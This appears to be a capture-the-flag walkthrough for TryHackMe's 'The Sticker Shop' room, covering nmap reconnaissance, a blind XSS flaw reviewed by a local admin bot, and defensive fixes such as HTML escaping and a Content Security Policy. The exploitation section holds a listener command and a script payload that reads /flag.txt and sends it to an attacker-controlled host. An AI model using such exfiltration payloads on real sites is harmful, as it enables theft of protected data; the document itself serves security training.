<img width="770" height="418" alt="sticker shop completion" src="https://github.com/user-attachments/assets/b4d80d5e-fa0c-47fa-853f-93db61217abe" />

<img width="1094" height="766" alt="sticker shop vm image" src="https://github.com/user-attachments/assets/5696620a-cc6a-4821-848c-43fe44024f5e" />



# TryHackMe: The Sticker Shop - Complete Technical Writeup

A comprehensive architectural analysis and walkthrough for **The Sticker Shop** challenge on TryHackMe. This entry highlights the real-world tension between network-level infrastructure hardening and application-layer oversights, specifically detailing the identification, exploitation, and mitigation of **Blind Cross-Site Scripting (XSS)**.

---

## 🔍 1. Reconnaissance & Network Enumeration

The engagement began with an aggressive network surface sweep targeting the host engine (`10.10.24.53`) to establish active listening services and map potential entry points:

```bash
nmap -sV --script vuln 10.10.24.53
```

### Initial Scan Discoveries
The scan completed in approximately 140.85 seconds, returning a highly streamlined but potentially misleading attack surface consisting of exactly two active endpoints:

*   **PORT 22/tcp (SSH):** Running OpenSSH 8.2p1 on an underlying Ubuntu Linux kernel.
*   **PORT 8080/tcp (HTTP):** Exposing an http-proxy running a Python backend powered by **Werkzeug 3.0.1 (Python 3.8.10)**.

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-25 17:26 UTC
Nmap scan report for 10.10.24.53
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1:
|     CVE-2023-38408    9.8    https://vulners.com     *EXPLOIT*
|     CVE-2020-15778    7.8    https://vulners.com
|     CVE-2020-12062    7.5    https://vulners.com     *EXPLOIT*
|     CVE-2021-28041    7.1    https://vulners.com
|     CVE-2021-41617    7.0    https://vulners.com
|     CVE-2025-26465    6.8    https://vulners.com
|     CVE-2023-51385    6.5    https://vulners.com
|     CVE-2023-48795    5.9    https://vulners.com
|     CVE-2020-14145    5.9    https://vulners.com     *EXPLOIT*
|     CVE-2016-20012    5.3    https://vulners.com
|_    CVE-2021-36368    3.7    https://vulners.com
8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### The Infrastructure Bait (Port 22)
Automated scanners immediately flag Port 22 with severe vulnerability alerts, highlighting critical bugs such as **CVE-2023-38408** (Remote Code Execution with a CVSS score of 9.8). 

In a real production environment or a structured capture-the-flag (CTF) room, it is easy to spend hours down this rabbit hole trying to pass public exploit scripts or running aggressive brute-force dictionary attacks against SSH login banners. However, the OpenSSH instance is properly hardened and relies entirely on secure cryptographic key pairs. This underscores a crucial defensive lesson: **automated script alerts require manual verification, and a secure front door does not protect you if the application running behind it leaves the back keys on the counter.**

---

## 💥 2. Vulnerability Mapping: Blind XSS Logic

Shifting attention to the application layer on Port 8080 reveals a specialized custom storefront layout. Interacting directly with sensitive target files like `http://10.10.24` drops a strict **401 Unauthorized** server error, confirming that access control lists (ACLs) successfully prevent external public network traffic from viewing the file.

However, inspecting the website's `/submit_feedback` features reveals a classic input-validation failure. The submission box accepts arbitrary string arguments and streams them directly into the backend storage infrastructure without executing string sanitization or context-aware HTML encoding.

### The Headless Bot Privilege Escalation
The challenge description hints that the site developers review customer feedback forms locally on the same server machine hosting the web service.

+------------------+                   +----------------------------------+
| Attacker Machine |                   | Host Target Server (10.10.24.53) |
+------------------+                   +----------------------------------+
|                                               |
|  1. Submits Unsanitized Script Payload         |
|---------------------------------------------->| [Port 8080: Web Application]
|                                               |       |
|                                               |       | Stores Payload in DB
|                                               |       v
|                                               | [Feedback Storage Queue]
|                                               |       |
|                                               |       | 2. Automated Admin Bot
|                                               |       |    Opens Submission Queue
|                                               |       v
|                                               | [Internal Headless Browser]
|                                               |    - Access via: localhost (127.0.0.1)
|                                               |    - Access Privilege: Bypasses 401 ACL
|                                               |    - Action: Executes Script Payload
|                                               |       |
|  3. Script Triggers fetch('/flag.txt')        |       |
|  4. Exfiltrates Data via HTTP GET Request     |       |
|<----------------------------------------------|-------+
v
[Attacker Listener Node]
(Captures Flag Parameter)


1.  **The Trigger:** A headless web automation tool (admin bot) processes the feedback queue on a routine script loop, opening and parsing every user submission from the loopback interface domain context (`http://127.0.0.1` or `localhost`).
2.  **Context Privilege:** Because the bot reviews submissions locally inside the loopback perimeter, it inherits server-side trust privileges. The `401 Unauthorized` filter blocks external incoming router traffic, but permits the local bot browser session to freely read `/flag.txt`.
3.  **The Flaw:** When the bot renders the unsanitized submission string, it executes whatever inline JavaScript code is contained within the input field. Because the script executes within the bot's authenticated browser space, it can read the local file contents and transmit them outward.

---

## 🚀 3. Exploitation Strategy & Script Execution

To take advantage of this Blind XSS vulnerability, the attack requires setting up an external network listener to receive data before submitting the payload string.

### Step 1: Initialize the Local Traffic Listener
Open an active web listener on your attacker command console (Port 80) to capture incoming network calls containing the string data:

```bash
sudo python3 -m http.server 80
```

### Step 2: Inject the JavaScript Exfiltration Payload
Submit the following structured JavaScript code directly inside the storefront feedback box, changing `<YOUR_ATTACKER_IP>` to the active interface address:

```html
<script>
    // 1. Command the internal bot's session context to grab the protected file
    fetch('/flag.txt')
    .then(response => response.text())
    .then(flagData => {
        // 2. URL-encode the text string to preserve special tokens during transfer
        // 3. Force an outbound GET request by binding the encoded string to a dynamic image tag source
        new Image().src = 'http://<YOUR_ATTACKER_IP>:80/log?flag=' + encodeURIComponent(flagData);
    });
</script>
```

When the admin bot parses the incoming message box, the embedded script executes natively, reads `/flag.txt`, appends the value as an HTTP parameter to the image string, and drops the connection directly into your waiting python server console, exposing the flag.

---

## 🛡️ 4. Defensive Architecture & Engineering

To fix this application flaw securely within a Python/Werkzeug framework, developers must move past simple blacklists and implement proper defense-in-depth measures.

### 1. Context-Aware Output Encoding
Never permit raw user data streams to parse directly inside the browser DOM. Before saving or displaying incoming user strings, filter them through an explicit HTML escape library to transform executable script tokens into inert display symbols:

```python
import html

def sanitize_customer_input(raw_user_string):
    # Converts hazardous execution characters into safe text entities
    # For example: "<" becomes "&lt;" and ">" becomes "&gt;"
    secured_output = html.escape(raw_user_string)
    return f"<div class='feedback-entry'>{secured_output}</div>"
```

### 2. Establish a Rigid Content Security Policy (CSP)
Configure defensive HTTP security header metadata to control where scripts are allowed to run and where data can be transmitted. A strong production header policy looks like this:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' http://trusted-internal-logging.local;
```
*   `script-src 'self'`: Disables all inline `<script>` injection vectors across the client application space.
*   `img-src 'self'`: Prevents scripts from calling unknown third-party internet locations via dynamic image tags, neutralizing data exfiltration attempts.

### 3. Apply the Principle of Least Privilege to System Bots
Automated maintenance bots or background workers should never run with generic, high-level privileges. Separate web application tasks so the bot account does not possess direct file-system read permission to sensitive system resources or configuration keys like root flags.

---

## 🏆 5. Milestone Met: Room Completion

Successful exploitation of the application-layer logic flaw bypasses the secure network infrastructure completely, yielding the final system flag token and confirming the room challenge as complete.

![TryHackMe Challenge Completion Confirmation Screen](images/room_complete.png)

*   **Platform Target:** [TryHackMe - The Sticker Shop Challenge Room](https://tryhackme.com)
*   **Assigned Difficulty:** Easy
*   **Demonstrated Competencies:** Attack Surface Mapping, Network Reconnaissance Verification, Vulnerability Scanner Management, Blind XSS Manipulation, Privileged Session Data Exfiltration, Defensive Secure Coding Principles.
